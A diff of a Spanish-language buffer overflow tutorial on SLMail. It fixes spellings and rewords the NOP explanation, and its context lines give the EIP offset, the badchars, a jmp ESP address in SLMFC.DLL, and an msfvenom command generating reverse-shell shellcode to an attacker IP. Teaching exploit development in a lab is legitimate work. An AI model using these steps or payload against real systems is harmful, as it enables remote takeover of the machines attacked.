@@ -53,7 +53,7 @@ En este punto si hacemos un searchsploit slmail vemos que hay varios exploits qu
 
 ## Explicación sencilla del stack buffer overflow
 
-Una explicación sencilla sería la siguiente. Cuando alguien se autentica contra el SLMail, tiene que introducir lógicamente un usuario y contraseña. Bien pues en el campo PASS no se está controlando la cantidad de bytes que puede aceptar, con lo cual si nosotros le pasamos más de los que tiene definidos a nivel de código se producirá un desbordamiento de memória, y estaremos sobreescribiendo partes de la memória que no deberian de tomar esos valores para una ejecución normal del programa.
+Una explicación sencilla sería la siguiente. Cuando alguien se autentica contra el SLMail, tiene que introducir lógicamente un usuario y contraseña. Bien pues en el campo PASS no se está controlando la cantidad de bytes que puede aceptar, con lo cual si nosotros le pasamos más de los que tiene definidos a nivel de código se producirá un desbordamiento de memoria, y estaremos sobreescribiendo partes de la memoria que no deberian de tomar esos valores para una ejecución normal del programa.
 
 Se trata de tomar el control del registro EIP, que siempre apunta a la próxima dirección de memoria a ejecutar, para que el flujo del programa se desplace hasta la dirección que nosotros queramos, donde habremos sobreescrito los valores de esas direcciones con nuestro shellcode, que nos lanzará una reverse shell y nos conectará a la máquina victima.
 
@@ -112,11 +112,11 @@ if __name__ == '__main__':
 
 El exploit le pasará nuestras "A" en el campo PASS de 350 en 350, la primera vez una "A", la segunda 350 "A", la tercera 700 "A", etc. También podremos ver cuantas "A" necesitamos pasarle para que se detenga la ejecución del programa y provocar una denegación de servicio.
 
-Ejecutamos el exploit y vemos lo que sucede en el inmunity debuguer. Podemos ver que se ha corrompido el programa porque hemos sobreescrito direcciones de memória, incluido el registro EIP que ahora apunta a la dirección 0x41414141, que son nuestras "A", y al no ser una dirección válida se detiene el flujo de ejecución.
+Ejecutamos el exploit y vemos lo que sucede en el inmunity debuguer. Podemos ver que se ha corrompido el programa porque hemos sobreescrito direcciones de memoria, incluido el registro EIP que ahora apunta a la dirección 0x41414141, que son nuestras "A", y al no ser una dirección válida se detiene el flujo de ejecución.
 
 ![](/assets/images/Stack-Buffer-Overflow-Windows/exploit-inicial.png)
 
-Vemos en la salida por pantalla de la ejecución del exploit que al enviar 2800 "A" es cuando desbordamos el tamaño del buffer, se sobreescribe el EIP y el programa no puede continuar porque la dirección 0x41414141 que son nuestras "A" no apunta a ninguna dirección de memória válida.
+Vemos en la salida por pantalla de la ejecución del exploit que al enviar 2800 "A" es cuando desbordamos el tamaño del buffer, se sobreescribe el EIP y el programa no puede continuar porque la dirección 0x41414141 que son nuestras "A" no apunta a ninguna dirección de memoria válida.
 
 El siguiente paso es crear un patrón de carácteres aleatorios con una utilidad de Mataploit llamada pattern_create.
 
@@ -211,7 +211,7 @@ Ejecutamos el script y vemos que efectivamente EIP ahora vale 0x42424242 que son
 
 ![](/assets/images/Stack-Buffer-Overflow-Windows/offset3.png)
 
-En este punto, lo que pongamos detrás de nuestras 2606 "A" va a sobreescribir el valor de EIP. Y lo que enviemos después de sobreescribir el EIP se va a meter en la dirección de memória donde apunta el registro ESP, que es donde empieza la pila o el stack de la memória. Y justo ahí es donde tenemos que sobreescribir lo que haya para meter nuestro shellcode. Después haremos que EIP apunte a una dirección de memória que contenga un salto al ESP, con lo que conseguiremos redirigir el flujo de ejecución del programa para que ejecute nuestro shellcode o código malicioso, que nos lanzará la deseada reverse shell.
+En este punto, lo que pongamos detrás de nuestras 2606 "A" va a sobreescribir el valor de EIP. Y lo que enviemos después de sobreescribir el EIP se va a meter en la dirección de memoria donde apunta el registro ESP, que es donde empieza la pila o el stack de la memoria. Y justo ahí es donde tenemos que sobreescribir lo que haya para meter nuestro shellcode. Después haremos que EIP apunte a una dirección de memoria que contenga un salto al ESP, con lo que conseguiremos redirigir el flujo de ejecución del programa para que ejecute nuestro shellcode o código malicioso, que nos lanzará la deseada reverse shell.
 
 Pero antes tenemos que calcular los badchars, que son carácteres que se deben evitar porque pueden hacer que nuestro shellcode no se interprete correctamente.
 
@@ -279,7 +279,7 @@ Vamos a generar un shellcode que no contenga estos badchars, y que nos lance una
 
 `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.15 LPORT=443 -a x86 --platform windows EXITFUNC=thread -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c`
 
-Solo nos falta calcular el valor que tiene que tener EIP, que tiene que ser una dirección de memória que contenga un salto al ESP (jmp ESP), que es donde estará nuestro shellcode.
+Solo nos falta calcular el valor que tiene que tener EIP, que tiene que ser una dirección de memoria que contenga un salto al ESP (jmp ESP), que es donde estará nuestro shellcode.
 
 Para ello ejecutamos otra utilidad de metasploit `/opt/metasploit-framework/embedded/framework/tools/exploit/nasm_shell.rb` y estando dentro de la shell escribimos `jmp ESP`, lo que nos devuelve el opcode FFE4.
 
@@ -287,11 +287,11 @@ Volvemos al inmunity y escribimos `!mona modules`. Esto nos sacará los módulos
 
 ![](/assets/images/Stack-Buffer-Overflow-Windows/modules.png)
 
-Ejecutamos `!mona find -s "\xff\xe4" -m SLMFC.DLL`. Esto nos buscará las direcciones de memória que contienen un jmp ESP (FFE4) en el módulo SLMFC.DLL. Elegiremos una dirección que no contenga ninguno de los badchars encontrados anteriormente. En nuestro caso 5F4A358F.
+Ejecutamos `!mona find -s "\xff\xe4" -m SLMFC.DLL`. Esto nos buscará las direcciones de memoria que contienen un jmp ESP (FFE4) en el módulo SLMFC.DLL. Elegiremos una dirección que no contenga ninguno de los badchars encontrados anteriormente. En nuestro caso 5F4A358F.
 
 ![](/assets/images/Stack-Buffer-Overflow-Windows/jmpesp.png)
 
-Por último modificamos el script para que envíe las 2606 "A" + la dirección que hace el salto al ESP + los nops (son instrucciones que no hacen nada para dar tiempo a que se interprete el shellcode) + el shellcode.
+Por último modificamos el script para que envíe las 2606 "A" + la dirección que hace el salto al ESP + los nops (son instrucciones que no hacen nada para asegurarnos de que no salta a otra dirección de memoria durante la ejecución del shellcode) + el shellcode.
 
 La dirección de salto al ESP tiene que ir en formato little endian, pero gracias a la línea `from struct import pack` podemos escribir la dirección así `pack("<L", 0x5f4a358f)` y pack ya se encarga de que se interprete en little endian. De no usar pack tendríamos que escribir la dirección empezando desde la derecha `0x8f354a5f`.
 
